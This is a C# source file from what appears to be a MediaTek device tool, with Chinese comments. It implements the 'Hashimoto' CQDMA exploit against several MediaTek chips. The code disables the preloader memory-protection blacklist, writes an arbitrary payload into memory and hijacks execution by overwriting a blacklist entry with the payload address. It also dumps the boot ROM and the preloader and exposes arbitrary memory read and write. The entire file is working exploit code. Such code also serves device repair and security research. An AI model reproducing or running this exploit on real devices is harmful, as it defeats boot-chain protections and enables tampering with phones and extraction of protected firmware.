using System;
using System.Threading.Tasks;
using tools.Modules.MTK.Protocol;
using tools.Modules.MTK.Models;
using tools.Modules.MTK.Hardware;

namespace tools.Modules.MTK.Exploit
{
    /// <summary>
    /// Hashimoto (CQDMA) 漏洞利用
    /// 原理: 利用 CQDMA (Crypto Queue DMA) 控制器进行任意内存读写
    /// 影响: MT6761, MT6765, MT6768, MT6771 等
    /// </summary>
    public class Hashimoto : ExploitBase
    {
        private readonly CqdmaEngine _cqdma;

        public Hashimoto(PreloaderProtocol preloader, ChipConfig chipConfig)
            : base(preloader, chipConfig)
        {
            if (chipConfig.CqdmaBase == 0 || chipConfig.ApDmaMem == 0)
            {
                throw new ArgumentException("Chip does not have CQDMA/AP_DMA_MEM base address configured");
            }

            _cqdma = new CqdmaEngine(preloader, chipConfig);
        }

        /// <summary>
        /// 执行漏洞利用 (发送 Payload)
        /// </summary>
        public override bool Exploit(byte[] payload, uint payloadAddr)
        {
            try
            {
                Log($"Starting Hashimoto (CQDMA) exploit, payload addr: 0x{payloadAddr:X}");

                // 先禁用黑名单
                DisableRangeBlacklist();

                // 将 Payload 按 4 字节对齐
                while (payload.Length % 4 != 0)
                {
                    byte[] padded = new byte[payload.Length + 1];
                    Array.Copy(payload, padded, payload.Length);
                    payload = padded;
                }

                // 将 Payload 写入内存
                Log("Writing payload to memory...");
                for (int i = 0; i < payload.Length; i += 4)
                {
                    uint word = BitConverter.ToUInt32(payload, i);
                    Preloader.Write32(payloadAddr + (uint)i, word);
                }

                // 通过修改黑名单入口跳转到 Payload
                if (ChipConfig.Blacklist != null && ChipConfig.Blacklist.Count > 0)
                {
                    uint blEntry = ChipConfig.Blacklist[0];
                    Log($"Setting jump address at blacklist[0]+0x40 (0x{blEntry + 0x40:X})...");
                    Preloader.Write32(blEntry + 0x40, payloadAddr);
                }

                Log("Hashimoto exploit completed");
                return true;
            }
            catch (Exception ex)
            {
                Log($"Hashimoto exploit failed: {ex.Message}");
                return false;
            }
        }

        /// <summary>
        /// 通过 CQDMA 读取内存
        /// </summary>
        public byte[] DaRead(uint address, uint length, bool useBlacklist = false)
        {
            Log($"Reading 0x{length:X} bytes from 0x{address:X} via CQDMA...");
            return _cqdma.MemRead(address, length, !useBlacklist);
        }

        /// <summary>
        /// 通过 CQDMA 写入内存
        /// </summary>
        public void DaWrite(uint address, byte[] data, bool useBlacklist = false)
        {
            Log($"Writing {data.Length} bytes to 0x{address:X} via CQDMA...");
            _cqdma.MemWrite(address, data, !useBlacklist);
        }

        /// <summary>
        /// 运行 Payload
        /// </summary>
        public override async Task<bool> RunPayloadAsync(byte[] payload, uint? addr = null)
        {
            uint payloadAddr = addr ?? ChipConfig.DaPayloadAddr;
            byte[] fixedPayload = FixPayload(payload, false);

            Log($"Running payload at 0x{payloadAddr:X}...");

            if (Exploit(fixedPayload, payloadAddr))
            {
                await Task.Delay(200);

                // 等待确认
                try
                {
                    var ack = Preloader.ReadDword();
                    if (ack == 0xA1A2A3A4)
                    {
                        Log("Payload executed successfully");
                        return true;
                    }
                }
                catch { }
            }

            return false;
        }

        /// <summary>
        /// Dump BROM (通过 CQDMA)
        /// </summary>
        public override async Task<byte[]?> DumpBromAsync(uint length = 0x20000)
        {
            try
            {
                Log($"Dumping BROM via CQDMA, length: 0x{length:X}...");

                DisableRangeBlacklist();

                byte[] brom = new byte[length];
                int lastProgress = 0;

                // CQDMA 每次读取 16 字节
                for (uint addr = 0; addr < length; addr += 16)
                {
                    byte[] chunk = _cqdma.MemRead(addr, 16, true);
                    Array.Copy(chunk, 0, brom, addr, Math.Min(16, (int)(length - addr)));

                    int progress = (int)(addr * 100 / length);
                    if (progress != lastProgress && progress % 10 == 0)
                    {
                        Log($"Progress: {progress}%, addr: 0x{addr:X}");
                        lastProgress = progress;
                    }
                }

                Log("BROM dump completed");
                return brom;
            }
            catch (Exception ex)
            {
                Log($"BROM dump failed: {ex.Message}");
                return null;
            }
        }

        /// <summary>
        /// Dump Preloader (通过 CQDMA)
        /// </summary>
        public override async Task<byte[]?> DumpPreloaderAsync()
        {
            try
            {
                Log("Dumping Preloader via CQDMA...");

                // Preloader 通常在 0x200000 - 0x240000
                const uint preloaderStart = 0x200000;
                const uint preloaderEnd = 0x240000;
                uint length = preloaderEnd - preloaderStart;

                DisableRangeBlacklist();

                byte[] preloader = new byte[length];
                int lastProgress = 0;

                for (uint offset = 0; offset < length; offset += 16)
                {
                    uint addr = preloaderStart + offset;
                    byte[] chunk = _cqdma.MemRead(addr, 16, true);
                    Array.Copy(chunk, 0, preloader, offset, Math.Min(16, (int)(length - offset)));

                    int progress = (int)(offset * 100 / length);
                    if (progress != lastProgress && progress % 10 == 0)
                    {
                        Log($"Progress: {progress}%, addr: 0x{addr:X}");
                        lastProgress = progress;
                    }
                }

                Log("Preloader dump completed");
                return preloader;
            }
            catch (Exception ex)
            {
                Log($"Preloader dump failed: {ex.Message}");
                return null;
            }
        }

        /// <summary>
        /// 禁用内存黑名单
        /// </summary>
        public override bool DisableRangeBlacklist()
        {
            try
            {
                Log("Disabling range blacklist via CQDMA...");

                if (ChipConfig.Blacklist == null || ChipConfig.Blacklist.Count == 0)
                {
                    Log("No blacklist configuration");
                    return true;
                }

                // 使用 CQDMA 绕过黑名单
                _cqdma.DisableRangeBlacklist(ChipConfig.Blacklist);

                Log("Blacklist disabled");
                return true;
            }
            catch (Exception ex)
            {
                Log($"Failed to disable blacklist: {ex.Message}");
                return false;
            }
        }
    }
}
